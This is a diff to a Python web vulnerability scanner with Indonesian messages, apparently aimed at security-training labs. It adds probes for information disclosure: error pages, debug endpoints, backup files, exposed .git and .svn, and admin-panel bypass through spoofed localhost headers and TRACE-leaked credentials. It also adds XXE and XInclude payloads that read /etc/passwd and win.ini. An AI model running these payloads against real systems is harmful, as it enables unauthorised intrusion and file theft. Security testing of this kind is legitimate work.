+                if 131 in self._confirmed or not self._within_budget():
+                    return
+                resp = self._info_fetch(clean_url, params={param: value})
+                if resp.error or not resp.text:
+                    continue
+                if base_marker and base_text == resp.text:
+                    continue
+                found = self._info_error_marker(resp.text)
+                if not found:
+                    continue
+                label, sample = found
+                if base_marker and base_marker[0] == label:
+                    continue
+                if sample and sample in base_text:
+                    continue
+                status = resp.status or 0
+                if status < 400 and label not in {"Python traceback", "Java stack frame", "framework stack trace", "ASP.NET error page"}:
+                    continue
+                url = urlunparse(urlparse(clean_url)._replace(query=urlencode({param: value})))
+                self._info_mark(131, url,
+                                f"Pesan error membocorkan detail internal pada {clean_url} (parameter {param}={value!r}, HTTP {status}, sumber {source}): "
+                                f"{label} -> {snippet(sample, 160)!r}; marker tidak ada pada baseline benign.",
+                                "info_disc_error_messages")
+                return
+
+    def _info_discovered_paths(self, pages: list[Page]) -> list[str]:
+        """Kumpulkan path dari robots.txt, sitemap, komentar HTML/JS, dan link halaman."""
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        found: list[str] = []
+
+        def add_path(raw: str) -> None:
+            raw = (raw or "").strip().strip("\"'<>")
+            if not raw or raw.startswith(("javascript:", "mailto:", "data:", "#")):
+                return
+            if raw.startswith("http://") or raw.startswith("https://"):
+                if not self._same_origin(raw):
+                    return
+                path = urlparse(raw).path or "/"
+            else:
+                path = raw.split("?")[0].split("#")[0]
+                if not path.startswith("/"):
+                    path = "/" + path
+            if DESTRUCTIVE_PATH_RE.search(path):
+                return
+            found.append(path)
+
+        for name in ("robots.txt", "sitemap.xml", ".well-known/security.txt"):
+            if not self._within_budget():
+                break
+            resp = self._info_fetch(urljoin(base + "/", name))
+            if resp.error or not resp.text or (resp.status or 0) >= 400:
+                continue
+            for line in resp.text.splitlines():
+                line = line.strip()
+                m = re.match(r"(?:Disallow|Allow|Sitemap)\s*:\s*(\S+)", line, re.I)
+                if m:
+                    add_path(m.group(1))
+            for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", resp.text, re.I):
+                add_path(loc)
+
+        blob = "\n".join(((pg.text or "") + "\n" + (pg.js_text or "")) for pg in pages[:15])
+        for comment in re.findall(r"<!--([\s\S]{0,800}?)-->", blob):
+            if re.search(r"debug|phpinfo|backup|admin|todo|env|console|test", comment, re.I):
+                for token in re.findall(r"/[A-Za-z0-9_\-./]{1,120}", comment):
+                    add_path(token)
+        for m in re.finditer(r"""['"](/(?:cgi-bin|debug|backup|admin|dev|test|internal|phpinfo)[A-Za-z0-9_\-./]{0,100})['"]""", blob, re.I):
+            add_path(m.group(1))
+
+        ordered: list[str] = []
+        seen = set()
+        for p in found:
+            p = p if p.startswith("/") else "/" + p
+            if p in seen:
+                continue
+            seen.add(p)
+            ordered.append(p)
+        return ordered[:40]
+
+    def _info_scan_debug_pages(self, pages: list[Page]) -> None:
+        if 132 in self._confirmed:
+            return
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        candidates = [
+            "/cgi-bin/phpinfo.php", "/phpinfo.php", "/info.php", "/debug", "/debug/", "/debug/vars",
+            "/console", "/_debug", "/__debug__/", "/actuator", "/actuator/env", "/actuator/health",
+            "/env", "/server-status", "/server-info", "/.env", "/trace", "/elmah.axd", "/_profiler/",
         ]
+        for path in self._info_discovered_paths(pages):
+            if re.search(r"debug|phpinfo|actuator|server-status|env|console|profiler|trace", path, re.I) and path not in candidates:
+                candidates.append(path)
+        baseline = self._info_fetch(self.target_url)
+        base_text = (baseline.text or "") if baseline and not baseline.error else ""
+        for path in candidates[:14]:
+            if 132 in self._confirmed or not self._within_budget():
+                return
+            url = urljoin(base + "/", path.lstrip("/"))
+            resp = self._info_fetch(url)
+            if resp.error or (resp.status or 0) not in (200, 206) or len(resp.text or "") < 30:
+                continue
+            text = resp.text or ""
+            if base_text and text.strip() == base_text.strip():
+                continue
+            hits = [h for h in self._info_debug_markers(text) if h not in (base_text or "")]
+            if not hits:
+                continue
+            strong = bool(set(hits) & {"phpinfo", "Spring Actuator endpoint", "file .env", "Apache server-status"})
+            if len(hits) < 2 and not strong:
+                continue
+            self._info_mark(132, url,
+                            f"Halaman debug/info terekspos di {url} (HTTP {resp.status}): {', '.join(sorted(set(hits))[:4])}; "
+                            f"konten tidak ada pada baseline halaman utama.",
+                            "info_disc_debug_page")
+            return
+
+    def _info_scan_backup_files(self, pages: list[Page]) -> None:
+        if 133 in self._confirmed:
+            return
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        dirs: list[str] = ["/backup/", "/backups/", "/backup", "/old/", "/src/", "/source/", "/files/"]
+        for path in self._info_discovered_paths(pages):
+            if re.search(r"backup|old|src|source|files", path, re.I):
+                dirs.insert(0, path if path.endswith("/") else path + "/")
+        files: list[str] = []
+        seen = set()
+        for directory in dirs[:5]:
+            if not self._within_budget():
+                break
+            durl = urljoin(base + "/", directory.lstrip("/"))
+            resp = self._info_fetch(durl)
+            if resp.error or (resp.status or 0) != 200 or not resp.text:
+                continue
+            for href in re.findall(r"""href=["']([^"']+)["']""", resp.text, re.I):
+                if href.startswith(("?", "#")):
+                    continue
+                furl = urljoin(durl, href)
+                if not self._same_origin(furl) or self._cors_is_asset(furl):
+                    continue
+                path = urlparse(furl).path
+                if re.search(r"\.(?:java|php|py|rb|js|ts|cs|aspx?|jsp|xml|yml|yaml|ini|conf|txt|zip|tar|gz|bak|old|orig|save)$", path, re.I):
+                    if furl not in seen:
+                        seen.add(furl)
+                        files.append(furl)
+        for page in pages[:10]:
+            p = urlparse(getattr(page, "url", "") or "")
+            if p.path and re.search(r"\.(?:php|java|py|rb|js|jsp|aspx?)$", p.path, re.I):
+                furl = urlunparse((p.scheme, p.netloc, p.path, "", "", ""))
+                if furl not in seen:
+                    seen.add(furl)
+                    files.append(furl)
+        suffixes = (".bak", "~", ".old", ".orig", ".save", ".copy", ".swp", ".java.bak", ".php.bak")
+        tested = 0
+        for furl in files[:6]:
+            if 133 in self._confirmed or not self._within_budget():
+                return
+            candidates = []
+            if re.search(r"(?:\.bak|~|\.old|\.orig|\.save|\.copy|\.swp|\.java|\.php|\.py|\.rb|\.jsp|\.aspx?)$", urlparse(furl).path, re.I):
+                candidates.append(furl)
+            candidates.extend(furl + suffix for suffix in suffixes)
+            for candidate in candidates:
+                if 133 in self._confirmed or not self._within_budget() or tested >= 16:
+                    return
+                tested += 1
+                resp = self._info_fetch(candidate)
+                if resp.error or (resp.status or 0) != 200 or len(resp.text or "") < 20:
+                    continue
+                found = self._info_source_marker(resp.text)
+                if not found:
+                    continue
+                label, sample = found
+                ctype = ""
+                for k, v in (resp.headers or {}).items():
+                    if str(k).lower() == "content-type":
+                        ctype = str(v).lower()
+                if "text/html" in ctype and re.search(r"<!doctype html|<html", resp.text[:400], re.I) and "<?php" not in resp.text:
+                    continue
+                self._info_mark(133, candidate,
+                                f"Source code disclosure via backup file terverifikasi: {candidate} (HTTP {resp.status}, {label}) "
+                                f"mengandung marker kode {snippet(sample, 60)!r}.",
+                                "info_disc_backup_files")
+                return
+
+    def _info_scan_auth_bypass(self, pages: list[Page]) -> None:
+        if 134 in self._confirmed:
+            return
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        admin_urls: list[str] = []
+        for page in pages[:12]:
+            for link in getattr(page, "links", [])[:40]:
+                if re.search(r"admin|manage|console", str(link), re.I) and self._same_origin(str(link)):
+                    admin_urls.append(str(link))
+        for path in ("/admin", "/administrator", "/admin-panel", "/manage", "/admin/users"):
+            admin_urls.append(urljoin(base + "/", path.lstrip("/")))
+        seen = set()
+        admin_markers = re.compile(r"admin panel|administrator|delete user|manage users|user list|users\b", re.I)
+        leaked_header = None
+        try:
+            trace = self._request("TRACE", self.target_url, allow_redirects=False)
+        except Exception:
+            trace = None
+        if trace and (trace.status or 0) == 200:
+            m = re.search(r"(Authorization|X-Api-Key|X-Auth-Token|Cookie):\s*([^\r\n]+)", trace.text or "", re.I)
+            if m:
+                leaked_header = (m.group(1), m.group(2).strip())
+        header_names = (
+            "X-Custom-IP-Authorization", "X-Forwarded-For", "X-Originating-IP", "X-Real-IP", "X-Client-IP",
+        )
+        for url in admin_urls[:4]:
+            if 134 in self._confirmed or not self._within_budget():
+                return
+            if url in seen:
+                continue
+            seen.add(url)
+            try:
+                baseline = self._request("GET", url, allow_redirects=False)
+            except Exception:
+                continue
+            if baseline.error:
+                continue
+            base_text = baseline.text or ""
+            base_status = baseline.status or 0
+            hint = bool(re.search(r"127\.0\.0\.1|localhost|administrator|admin", base_text, re.I))
+            if base_status not in (400, 401, 403, 405) and not hint:
+                continue
+            for header in header_names:
+                if 134 in self._confirmed or not self._within_budget():
+                    return
+                resp = self._request("GET", url, headers={header: "127.0.0.1"}, allow_redirects=False)
+                if resp.error or (resp.status or 0) != 200:
+                    continue
+                text = resp.text or ""
+                if not admin_markers.search(text) and len(text) <= len(base_text) + 50:
+                    continue
+                if re.search(r"""<input[^>]+type=["']?password""", text, re.I):
+                    continue
+                self._info_mark(134, url,
+                                f"Auth bypass via information disclosure terverifikasi: {url} semula HTTP {base_status}, "
+                                f"memberi konten admin (HTTP 200) dengan header {header}: 127.0.0.1"
+                                + (f"; header {leaked_header[0]} juga bocor via TRACE" if leaked_header else "") + ".",
+                                "info_disc_auth_bypass")
+                return
+            if leaked_header:
+                resp = self._request("GET", url, headers={leaked_header[0]: leaked_header[1]}, allow_redirects=False)
+                if not resp.error and (resp.status or 0) == 200 and admin_markers.search(resp.text or ""):
+                    self._info_mark(134, url,
+                                    f"Auth bypass via information disclosure terverifikasi: header {leaked_header[0]} "
+                                    f"bocor melalui TRACE dan membuka {url} (HTTP 200, konten admin).",
+                                    "info_disc_auth_bypass")
+                    return
+
+    def _info_scan_vcs(self, pages: list[Page]) -> None:
+        if 135 in self._confirmed:
+            return
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        paths = [
+            "/.git/HEAD", "/.git/config", "/.git/index", "/.git/logs/HEAD",
+            "/.git/refs/heads/master", "/.git/refs/heads/main", "/.git/COMMIT_EDITMSG",
+            "/.git/packed-refs", "/.git/description", "/.git/info/refs",
+            "/.svn/wc.db", "/.svn/entries", "/.hg/requires", "/.hg/store/00manifest.i",
+            "/.git/", "/.svn/",
+        ]
+        for path in self._info_discovered_paths(pages):
+            if re.search(r"\.git|\.svn|\.hg", path, re.I) and path not in paths:
+                paths.insert(0, path)
+        for path in paths[:10]:
+            if 135 in self._confirmed or not self._within_budget():
+                return
+            url = urljoin(base + "/", path.lstrip("/"))
+            resp = self._info_fetch(url)
+            if resp.error or (resp.status or 0) != 200:
+                continue
+            text = resp.text or ""
+            head = text.lstrip()[:200]
+            kind = None
+            if path.endswith("HEAD") and re.match(r"ref:\s+refs/", head):
+                kind = ".git HEAD (repository exposed)"
+            elif path.endswith("config") and "[core]" in text and "repositoryformatversion" in text:
+                kind = ".git config"
+            elif path.endswith("index") and "DIRC" in head:
+                kind = ".git index"
+            elif path.endswith("logs/HEAD") and re.search(r"[0-9a-f]{40}\s+[0-9a-f]{40}\s+", text):
+                kind = ".git reflog"
+            elif path.endswith(("master", "main")) and re.fullmatch(r"[0-9a-f]{40}\s*", text.strip() or ""):
+                kind = ".git ref"
+            elif path.endswith("COMMIT_EDITMSG") and text.strip():
+                kind = ".git commit message"
+            elif path.endswith("packed-refs") and re.search(r"^[0-9a-f]{40}\s+refs/", text, re.M):
+                kind = ".git packed-refs"
+            elif path.endswith("wc.db") and "SQLite format 3" in head:
+                kind = ".svn wc.db"
+            elif path.endswith("entries") and re.search(r"\b(?:dir|file)\b", text):
+                kind = ".svn entries"
+            elif path.endswith("requires") and re.search(r"(?:revlog|store|fncache)", text):
+                kind = ".hg requires"
+            elif path.endswith("/") and re.search(r">\s*(?:HEAD|config|objects|refs)\s*<|Index of /\.git", text, re.I):
+                kind = "directory listing .git"
+            if not kind:
+                continue
+            self._info_mark(135, url,
+                            f"Information disclosure repositori VCS terverifikasi: {url} (HTTP 200) mengekspos {kind}; "
+                            f"awal konten {snippet(text, 90)!r}.",
+                            "info_disc_vcs_history")
+            return
 
     def phase_information_disclosure(self, pages: list[Page], points: list[Point]) -> None:
         if not self._within_budget():
             return
-        target = self.target_url
-        pu = urlparse(target)
-        origin = f"{pu.scheme}://{pu.netloc}"
-        candidates = [target]
-        seen = {target}
-        for pg in pages[:12]:
-            u = getattr(pg, "url", "") or ""
-            if u and u not in seen:
-                try:
-                    if self._same_origin(u): seen.add(u); candidates.append(u)
-                except Exception: pass
-
-        # 131: Information disclosure in error messages
-        if 131 not in self._confirmed and self._within_budget():
-            probes = [("GET", target, {"id": "'\"<"}, None), ("GET", target, {"id": "1e309"}, None), ("GET", target, {"file": "../../../../etc/passwd"}, None)]
-            for p in points[:10]:
-                try:
-                    nm = getattr(p, "name", "") or "id"
-                    probes.append((getattr(p,"method","GET") or "GET", getattr(p,"url",target), {nm: "'\""}, None))
-                except Exception: pass
-            base_text = ""
-            try: base_text = getattr(self._request("GET", target, allow_redirects=True), "text", "") or ""
-            except Exception: pass
-            for method, url, params, data in probes[:18]:
-                if 131 in self._confirmed or not self._within_budget(): break
-                try: r = self._request(method, url, params=params, data=data, allow_redirects=True)
-                except Exception: continue
-                txt = getattr(r, "text", "") or ""
-                if not txt or txt == base_text: continue
-                for pat, label in self._info_sensitive_patterns():
-                    m = pat.search(txt)
-                    if m and not pat.search(base_text):
-                        self._info_mark(131, url, f"Information disclosure pada error/debug message terverifikasi di {url} (param {params}): {label} -> {m.group(0)[:140]!r} (tidak ada pada baseline).", "info_disc_error_messages")
-                        break
-
-        # 132: Information disclosure on debug page
-        if 132 not in self._confirmed and self._within_budget():
-            debug_paths = ["/debug","/debug/","/console","/phpinfo.php","/info.php","/server-status","/actuator","/actuator/env","/actuator/health","/_profiler/","/trace","/elmah.axd","/server-info","/status","/__debug__/"]
-            base_text = ""
-            try: base_text = getattr(self._request("GET", target, allow_redirects=True), "text", "") or ""
-            except Exception: pass
-            for dp in debug_paths:
-                if 132 in self._confirmed or not self._within_budget(): break
-                url = urljoin(origin + "/", dp.lstrip("/"))
-                try: r = self._request("GET", url, allow_redirects=True)
-                except Exception: continue
-                st = getattr(r, "status", 0) or 0
-                txt = getattr(r, "text", "") or ""
-                if st not in (200,206) or len(txt) < 40: continue
-                dbg_hits = []
-                for pat, label in self._info_sensitive_patterns() + [(re.compile(r"phpinfo\(\)|PHP Version|<title>phpinfo|actuator|Environment|beans|mappings|_profiler", re.I), "halaman debug/info")]:
-                    if pat.search(txt) and not pat.search(base_text):
-                        dbg_hits.append(label)
-                if dbg_hits:
-                    self._info_mark(132, url, f"Debug/info page terverifikasi di {url} (HTTP {st}): terdeteksi {', '.join(sorted(set(dbg_hits))[:4])}.", "info_disc_debug_page")
-                    break
-
-        # 133: Source code disclosure via backup files
-        if 133 not in self._confirmed and self._within_budget():
-            paths = [pu.path or "/index.php", "/index.php", "/app.js", "/main.js", "/config.php", "/login.php"]
-            for pg in pages[:8]:
-                pth = urlparse(getattr(pg,"url","") or "").path
-                if pth and pth not in paths: paths.append(pth)
-            suffixes = [".bak","~",".old",".orig",".save",".swp",".copy"]
-            src_markers = re.compile(r"<\?php|function\s+\w+\(|import\s+\w+|from\s+\w+|class\s+\w+|def\s+\w+\(|var\s+\w+\s*=|const\s+\w+\s*=", re.I)
-            for basep in paths[:10]:
-                if 133 in self._confirmed or not self._within_budget(): break
-                for suf in suffixes:
-                    if 133 in self._confirmed or not self._within_budget(): break
-                    candp = basep.rstrip("/") + suf if basep != "/" else "/index.php" + suf
-                    url = urljoin(origin + "/", candp.lstrip("/"))
-                    try: r = self._request("GET", url, allow_redirects=True)
-                    except Exception: continue
-                    st = getattr(r, "status", 0) or 0
-                    txt = getattr(r, "text", "") or ""
-                    if st != 200 or len(txt) < 20: continue
-                    sm = src_markers.search(txt)
-                    if sm:
-                        orig_url = urljoin(origin + "/", basep.lstrip("/"))
-                        try: ot = getattr(self._request("GET", orig_url, allow_redirects=True), "text", "") or ""
-                        except Exception: ot = ""
-                        if txt != ot or ("<?php" in txt.lower() and "<?php" not in ot.lower()):
-                            self._info_mark(133, url, f"Source code disclosure via backup file terverifikasi: {url} (HTTP 200) mengandung marker kode ({sm.group(0)[:40]!r}).", "info_disc_backup_files")
-                            break
-
-        # 134: Authentication bypass via information disclosure (bukti bypass nyata)
-        if 134 not in self._confirmed and self._within_budget():
-            try: tr = self._request("TRACE", target, allow_redirects=False)
-            except Exception: tr = None
-            if tr and (getattr(tr,"status",0) or 0) == 200:
-                ttxt = getattr(tr,"text","") or ""
-                m = re.search(r"(Authorization|X-Api-Key|X-Auth-Token|Cookie):\s*([^\r\n]+)", ttxt, re.I)
-                if m:
-                    hdr_name, hdr_val = m.group(1), m.group(2).strip()
-                    for ap in ("/admin","/administrator","/admin-panel","/manage"):
-                        if 134 in self._confirmed or not self._within_budget(): break
-                        aurl = urljoin(origin + "/", ap.lstrip("/"))
-                        try:
-                            r0 = self._request("GET", aurl, allow_redirects=True)
-                            r1 = self._request("GET", aurl, headers={hdr_name: hdr_val}, allow_redirects=True)
-                        except Exception: continue
-                        s0 = getattr(r0,"status",0) or 0; s1 = getattr(r1,"status",0) or 0
-                        t0 = getattr(r0,"text","") or ""; t1 = getattr(r1,"text","") or ""
-                        if s0 in (401,403,302,301) and s1 == 200 and len(t1) > len(t0)+50 and t1 != t0:
-                            self._info_mark(134, aurl, f"Auth bypass via information disclosure terverifikasi: TRACE mengungkap {hdr_name}; akses {aurl} berubah {s0}->{s1}.", "info_disc_auth_bypass")
-                            break
-
-        # 135: Information disclosure in version control history
-        if 135 not in self._confirmed and self._within_budget():
-            vcs_paths = ["/.git/HEAD","/.git/config","/.git/index","/.svn/entries","/.svn/wc.db","/.hg/requires"]
-            for vp in vcs_paths:
-                if 135 in self._confirmed or not self._within_budget(): break
-                url = urljoin(origin + "/", vp.lstrip("/"))
-                try: r = self._request("GET", url, allow_redirects=True)
-                except Exception: continue
-                st = getattr(r, "status", 0) or 0
-                txt = getattr(r, "text", "") or ""
-                body = txt.lstrip()
-                if st != 200: continue
-                ok=False; kind="VCS"
-                if vp.endswith("HEAD") and body.startswith("ref:"): ok,kind=True,".git HEAD"
-                elif vp.endswith("config") and "[core]" in txt: ok,kind=True,".git config"
-                elif vp.endswith("entries") and re.search(r"\b(dir|file)\b", txt): ok,kind=True,".svn entries"
-                elif vp.endswith("wc.db") and "SQLite format" in txt[:60]: ok,kind=True,".svn wc.db"
-                elif vp.endswith("index") and "DIRC" in txt[:20]: ok,kind=True,".git index"
-                if ok:
-                    self._info_mark(135, url, f"Information disclosure VCS history terverifikasi: {url} (HTTP 200) berisi data {kind} ({txt[:80]!r}).", "info_disc_vcs_history")
-                    break
-
-
+        self._info_scan_error_messages(pages, points)
+        self._info_scan_debug_pages(pages)
+        self._info_scan_backup_files(pages)
+        self._info_scan_auth_bypass(pages)
+        self._info_scan_vcs(pages)
 
     # ======================== HTTP Host header attacks (136-142, konservatif, bukti terverifikasi) ========================
 
@@ -6237,274 +6709,462 @@ class SatriaBaruScanner:
         # tetap not_confirmed (anti false positive).
 
 
-    # ======================== XXE (konservatif, probe terkontrol & bukti kuat) ========================
+    # ======================== XXE (75-83, multi-vektor & bukti kuat) ========================
 
     @staticmethod
-    def _xxe_file_evidence(text: str) -> bool:
-        """Bukti file-read kuat & tidak ambigu (mis. /etc/passwd)."""
+    def _xxe_file_marker(text: str):
+        """Marker isi file yang spesifik (bukan kata umum) untuk mengurangi false positive."""
         if not text:
-            return False
-        return bool(re.search(r"\broot:[^:\n\r]*:0:0:", text))
+            return None
+        checks = (
+            (re.compile(r"\broot:[^:\r\n]{0,40}:0:0:"), "/etc/passwd (root:x:0:0)"),
+            (re.compile(r"\bdaemon:[^:\r\n]{0,40}:1:1:"), "/etc/passwd (daemon)"),
+            (re.compile(r"for 16-bit app support", re.I), "Windows win.ini"),
+            (re.compile(r"(?im)^\s*\[(?:fonts|mci extensions)\]\s*$"), "Windows win.ini"),
+        )
+        for pat, label in checks:
+            m = pat.search(text)
+            if m:
+                return label, m.group(0)
+        return None
 
     @staticmethod
-    def _xxe_error_context(resp: "Response") -> bool:
-        if resp.status is not None and resp.status >= 400:
-            return True
-        t = resp.text or ""
-        return bool(re.search(r"\b(?:error|exception|parser|xml parsing|entity|doctype|sax|xerces|libxml|simplexml)\b", t, re.I))
+    def _xxe_metadata_marker(text: str):
+        if not text:
+            return None
+        checks = (
+            (re.compile(r'"(?:AccessKeyId|SecretAccessKey)"\s*:'), "kredensial metadata IAM"),
+            (re.compile(r"\b(?:ami-id|instance-id|placement/availability-zone)\b"), "metadata instance"),
+        )
+        for pat, label in checks:
+            m = pat.search(text)
+            if m:
+                return label, m.group(0)
+        return None
 
-    def _xxe_candidate_urls(self, pages: list[Page]) -> list[str]:
-        urls = [self.target_url]
-        for page in pages:
-            urls.append(page.url)
-            for form in page.forms:
-                if form.action:
-                    urls.append(form.action)
-            for link in getattr(page, "links", [])[:30]:
-                urls.append(link)
-        base = self.target_url.rstrip("/")
-        for suffix in ("/product/stock", "/product/stock/check", "/stock", "/stock/check",
-                       "/product/check", "/checkstock", "/api/stock", "/xml", "/feedback/submit"):
-            urls.append(base + suffix)
-        out: list[str] = []
-        seen = set()
-        for u in urls:
-            if not u:
-                continue
+    def _xxe_endpoints(self, pages: list[Page]) -> list[str]:
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        found: list[str] = []
+
+        def add(raw: str) -> None:
+            raw = (raw or "").strip()
+            if not raw or raw.startswith(("javascript:", "mailto:", "data:", "#")):
+                return
             try:
-                cu = canonical_url(u)
+                absolute = raw if re.match(r"^https?://", raw, re.I) else urljoin(base + "/", raw.lstrip("/"))
+                cu = canonical_url(absolute)
             except Exception:
-                cu = u
-            if not cu or cu in seen or not self._same_origin(cu):
-                continue
+                return
+            if not cu or not self._same_origin(cu):
+                return
             if DESTRUCTIVE_PATH_RE.search(urlparse(cu).path or "/"):
-                continue
-            seen.add(cu)
-            out.append(cu)
+                return
+            if cu not in found:
+                found.append(cu)
+
+        for path in ("product/stock", "product/stock/check", "stock", "stock/check", "api/stock",
+                     "checkstock", "product/check", "xml", "soap", "api/xml", "feedback/submit"):
+            add(path)
+        for page in pages[:25]:
+            add(page.url)
+            for form in getattr(page, "forms", [])[:10]:
+                names = {str(n).lower() for n, _, _ in getattr(form, "fields", [])}
+                if names & {"productid", "storeid"} or re.search(r"stock|xml|soap", getattr(form, "action", "") or "", re.I):
+                    add(form.action)
+            blob = (page.text or "") + "\n" + (page.js_text or "")
+            for m in re.finditer(r"""<form[^>]+action=["']([^"']+)["']""", blob, re.I):
+                if re.search(r"stock|xml|soap|product", m.group(1), re.I):
+                    add(m.group(1))
+            for m in re.finditer(r"""['"]([^'"\s]{0,120}(?:stock|xml|soap)[^'"\s]{0,120})['"]""", blob, re.I):
+                add(m.group(1))
+        # Halaman produk memuat pemanggilan stock check pada JS.
+        if self._lab_session_login():
+            for probe in ("product?productId=1", ""):
+                if not self._within_budget():
+                    break
+                url = urljoin(base + "/", probe)
+                resp = self._request("GET", url, allow_redirects=True)
+                if resp.error or not resp.text:
+                    continue
+                blob = resp.text or ""
+                for m in re.finditer(r"""['"]([^'"\s]{0,140}(?:stock|xml|soap)[^'"\s]{0,140})['"]""", blob, re.I):
+                    add(m.group(1))
+                for m in re.finditer(r"""\b(?:fetch|axios\.(?:get|post|request)|\.open)\s*\(\s*(?:['"][A-Za-z]+['"]\s*,\s*)?['"]([^'"]{1,200})['"]""", blob, re.I):
+                    add(m.group(1))
 
         def score(u: str) -> int:
             ul = u.lower()
             s = 0
-            for kw in ("stock", "product", "xml", "check", "api", "soap", "feed", "upload", "avatar", "image", "import"):
+            for kw, w in (("stock", 10), ("xml", 7), ("soap", 6), ("product", 5), ("api", 3), ("check", 3)):
                 if kw in ul:
-                    s += 3
+                    s += w
             return -s
-        out.sort(key=score)
-        ordered = []
-        seen2 = set()
-        for u in [self.target_url] + out:
-            try:
-                cu = canonical_url(u)
-            except Exception:
-                cu = u
-            if cu in seen2:
-                continue
-            seen2.add(cu)
-            ordered.append(cu)
-        return ordered[:18]
 
-    def _xxe_form_targets(self, pages: list[Page]) -> list[tuple[str, str, dict[str, str]]]:
-        out: list[tuple[str, str, dict[str, str]]] = []
-        seen = set()
-        for page in pages:
-            for form in page.forms:
-                if not self._same_origin(form.action):
-                    continue
-                if DESTRUCTIVE_PATH_RE.search(urlparse(form.action).path or "/"):
-                    continue
-                fields = {n: v for n, v, _ in form.fields}
-                key = (form.action, (form.method or "get").lower(), ",".join(sorted(fields.keys())[:8]))
-                if key in seen:
-                    continue
-                seen.add(key)
-                out.append((form.action, (form.method or "get").lower(), fields))
-        return out
+        ordered = [canonical_url(self.target_url)]
+        for u in sorted(found, key=score):
+            if u not in ordered:
+                ordered.append(u)
+        return ordered[:10]
 
     def _xxe_post_xml(self, url: str, xml_body: str) -> "Response":
-        headers = {"Content-Type": "application/xml; charset=UTF-8",
-                   "Accept": "application/xml,text/xml,text/plain,*/*"}
-        resp = self._request("POST", url, data=xml_body, headers=headers)
-        if resp.error or resp.status == 415:
-            resp2 = self._request("POST", url, data=xml_body,
-                                  headers={"Content-Type": "text/xml; charset=UTF-8",
-                                           "Accept": "application/xml,text/xml,text/plain,*/*"})
-            if not resp2.error and (resp.error or resp.status == 415 or len(resp2.text or "") > len(resp.text or "")):
-                return resp2
-        return resp
+        attempts = (
+            {"Content-Type": "application/xml; charset=UTF-8", "Accept": "application/xml,text/xml,text/plain,*/*"},
+            {"Content-Type": "text/xml; charset=UTF-8", "Accept": "application/xml,text/xml,text/plain,*/*"},
+            {"Content-Type": "application/xml", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"},
+        )
+        last = None
+        for headers in attempts:
+            if not self._within_budget():
+                break
+            resp = self._request("POST", url, data=xml_body, headers=headers)
+            last = resp
+            if resp.error:
+                continue
+            if resp.status in (401, 403, 404, 405):
+                return resp
+            if resp.status == 415:
+                continue
+            return resp
+        return last if last is not None else Response(None, url, "", {}, 0.0, error="budget_exhausted")
+
+    def _xxe_endpoint_ready(self, url: str) -> tuple[bool, "Response | None"]:
+        cache = getattr(self, "_xxe_ready", None)
+        if cache is None:
+            cache = {}
+            self._xxe_ready = cache
+        if url in cache:
+            return cache[url]
+        benign = ('<?xml version="1.0" encoding="UTF-8"?>'
+                  '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>')
+        resp = self._xxe_post_xml(url, benign)
+        if resp is None or resp.error or resp.status is None:
+            cache[url] = (False, resp)
+            return cache[url]
+        if resp.status in (301, 302, 303, 307, 308, 401, 403, 404, 405, 415):
+            cache[url] = (False, resp)
+            return cache[url]
+        low = (resp.text or "").lower()
+        if ("password" in low and "login" in low) or "<title>login" in low:
+            cache[url] = (False, resp)
+            return cache[url]
+        cache[url] = (True, resp)
+        return cache[url]
+
+    def _xxe_bodies(self, uri: str) -> list[str]:
+        return [
+            ('<?xml version="1.0" encoding="UTF-8"?>\n'
+             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{uri}"> ]>\n'
+             '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'),
+            ('<?xml version="1.0" encoding="UTF-8"?>\n'
+             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{uri}"> ]>\n'
+             '<stockCheck><productId>1</productId><storeId>1</storeId><name>&xxe;</name></stockCheck>'),
+            ('<?xml version="1.0" encoding="UTF-8"?>\n'
+             f'<!DOCTYPE data [ <!ENTITY file SYSTEM "{uri}"> ]>\n'
+             '<data><id>&file;</id></data>'),
+            ('<?xml version="1.0" encoding="UTF-8"?>\n'
+             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{uri}"> ]>\n'
+             '<foo>&xxe;</foo>'),
+        ]
+
+    def _xxe_try_file_entity(self, endpoints: list[str], uris: list[str]) -> tuple[str, str, str, str] | None:
+        """Cari bukti in-band file read pada entitas eksternal; kembalikan (url, uri, marker, sample)."""
+        for url in endpoints:
+            ready, baseline = self._xxe_endpoint_ready(url)
+            if not ready:
+                continue
+            base_text = (baseline.text or "") if baseline else ""
+            for uri in uris:
+                for body in self._xxe_bodies(uri):
+                    if not self._within_budget():
+                        return None
+                    resp = self._xxe_post_xml(url, body)
+                    if resp is None or resp.error or not resp.text:
+                        continue
+                    found = self._xxe_file_marker(resp.text)
+                    if not found:
+                        continue
+                    label, sample = found
+                    if sample and sample in base_text:
+                        continue
+                    if uri.split("/")[-1] and uri.split("/")[-1] in body and sample in body:
+                        continue
+                    return url, uri, label, sample
+        return None
+
+    def _xxe_try_xinclude(self, endpoints: list[str], pages: list[Page]) -> tuple[str, str, str] | None:
+        xinc = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
+                '<xi:include parse="text" href="file:///etc/passwd"/></foo>')
+        xinc_win = ('<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
+                    '<xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>')
+        for url in endpoints:
+            ready, baseline = self._xxe_endpoint_ready(url)
+            if not ready:
+                continue
+            base_text = (baseline.text or "") if baseline else ""
+            # Vektor 1: parameter form yang disisipkan server ke dokumen XML.
+            for payload in (xinc, xinc_win):
+                for data in ({"productId": payload, "storeId": "1"}, {"productId": payload}):
+                    if not self._within_budget():
+                        return None
+                    resp = self._request("POST", url, data=data)
+                    if resp.error or not resp.text:
+                        continue
+                    found = self._xxe_file_marker(resp.text)
+                    if found and not (found[1] in base_text):
+                        return url, "form productId", f"{found[0]}: {found[1]}"
